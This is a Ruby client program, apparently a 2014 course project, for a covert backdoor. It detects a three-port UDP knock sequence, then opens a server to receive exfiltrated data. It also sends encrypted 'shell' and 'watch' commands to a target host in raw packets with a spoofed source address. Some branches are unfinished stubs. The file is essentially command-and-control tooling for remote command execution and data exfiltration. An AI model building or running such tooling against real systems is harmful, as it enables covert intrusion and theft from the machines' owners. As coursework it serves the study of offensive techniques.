#!/usr/bin/env ruby
=begin
-------------------------------------------------------------------------------------
-- SOURCE FILE:   client.rb - description goes here
--
-- PROGRAM:       client
--                ./client.rb
--
-- FUNCTIONS:     stuff here
--
-- Ruby Gems req: 
-- 
-- DATE:          May/June 2014
--
-- REVISIONS:     See development repo: https://github.com/deuterium/comp8505-final
--
-- DESIGNERS:     Chris Wood - chriswood.ca@gmail.com
--
-- PROGRAMMERS:   Chris Wood - chriswood.ca@gmail.com
-- 
-- NOTES:         notes might go here
---------------------------------------------------------------------------------------
=end

require 'packetfu'
require 'openssl'
require 'readline'
require 'ipaddress'
require 'socket'
require_relative 'util.rb'

## Variables

## Application Strings
CONFIG_FILE = "client.conf"
CONFIG_FILE_DEFAULT = "\# Make sure these settings match the server settings\n"
CONFIG_FILE_DEFAULT << "\# pen_prot = tcp\n"
CONFIG_FILE_DEFAULT << "\# pen_port = 6886\n"
CONFIG_FILE_DEFAULT << "\# exfil_prot = tcp\n"
CONFIG_FILE_DEFAULT << "\# exfil_port = 8668\n"
CONFIG_FILE_DEFAULT << "\# interface = eth1\n"
CONFIG_FILE_DEFAULT << "\# target_ip = 8.8.8.8\n"
CONFIG_EDIT = "Please edit #{CONFIG_FILE} and relaunch."
CONFIG_CREATE = "Configuration file created. #{CONFIG_EDIT}"
CONFIG_INVALID = "Error parsing configuration. #{CONFIG_EDIT}"
PAYLOAD_REGEX = /^(#{AUTH_STRING}) (shell|watch) .+$/
INPUT_REGEX = /^(shell|watch) .+$/

## Functions

def listen_for_knock
  puts "starting silent listen for knock\n>"
  filter = "udp or tcp"
  begin
    cap = PacketFu::Capture.new(:iface => $cfg_iface,
        :start => true,
        :promic => true,
        :filter => filter)
      k1, k2, k3 = false, false, false
      k4, k5, k6 = false, false, false
      config = nil
      cap.stream.each do |p|
        pkt =  PacketFu::Packet.parse(p)
        if PacketFu::UDPPacket.can_parse?(p)
          #UDP
          puts "udp: #{pkt.udp_dst}"
          if pkt.udp_dst == 44444
            k1 = true
          elsif pkt.udp_dst == 55555
            k2 = true
            config = decrypt(pkt.payload)
          elsif pkt.udp_dst == 44544
            k3 = true
          end
        elsif PacketFu::TCPPacket.can_parse?(p)
          #TCP
          #puts "tcp: #{pkt.tcp_dst}"
        else
          #not implemented
        end
        if k1 && k2 && k3
          puts "knock recv"
          k1, k2, k3 = false, false, false
          start_receiving_server(config)
        elsif k4 && k5 && k6
          puts "knock recv"
          k4, k5, k6 = false, false, false
          start_receiving_server(config)
        else
          #not implemented
        end
      end
    rescue Exception => e
      puts "error in pkt capture"
    end

    puts "bottom"
end

def start_receiving_server(config)
  cfg_items = config.split(',')
  if cfg_items[0] == UDP
    recv_thread = Thread.new {
      puts "server started"
      socket = UDPSocket.new
      socket.bind('0.0.0.0', cfg_items[1].to_i)
      max_time = cfg_items[2].to_i
      timer = Thread.new {sleep max_time}
      payload = nil
      loop {
        if timer.status == false #thread has completed
          break
        end
        #check size for recv
        #payload += decrpyt(socket.recv(1024))
      }
      puts "server ending"
    }
  elsif cfg_items[0] == TCP
    #coming
    puts TCP
  else
    #not implemented
  end
end

def start_command_loop
  puts "+ enter a command (2 options)"
  puts "+ shell (cmd)"
  puts "+ watch (dir|file) (path)"
  puts "+ \"ctrl + c\" to exit"
  loop {
    input = Readline.readline('> ', true)  
    if input.match(INPUT_REGEX)
      send_pkt_server_async(input.strip)
    else
      puts "Incorrect command format"
    end
  }
end

def send_pkt_server_async(command)
  if $cfg_pen_protocol == TCP
    # handle TCP here
  elsif $cfg_pen_protocol == UDP
    payload = "#{AUTH_STRING} #{command}"
    if payload.match(PAYLOAD_REGEX)
      udp_packet(payload)
    else
      exit_reason("Error with payload validation")
    end
  end
end

def udp_packet(payload)
  config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> $cfg_iface)).config
  udp_pkt = PacketFu::UDPPacket.new(:config => config, :flavor => "Linux")

  udp_pkt.udp_dst = $cfg_pen_port
  udp_pkt.udp_src = rand(0xffff)
  udp_pkt.ip_saddr = "8.8.8.8"
  #udp_pkt.ip_saddr = [rand(0xff),rand(0xff),rand(0xff),rand(0xff)].join('.')
  udp_pkt.ip_daddr = $cfg_target_ip
  udp_pkt.payload = encrypt(payload)

  udp_pkt.recalc
  udp_pkt.to_w($cfg_iface)

  puts "udp packet sent #{$cfg_target_ip} on #{$cfg_pen_port}"
end

## Main

load_config_file
validate_target_ip
puts "+ Welcome to \"not a hacking\" program"
begin
  listening_thread = Thread.new { listen_for_knock }
  start_command_loop
  listening_thread.join
rescue Interrupt
  puts "ctrl+c received"
  Thread.kill(listening_thread)
  exit 0
end
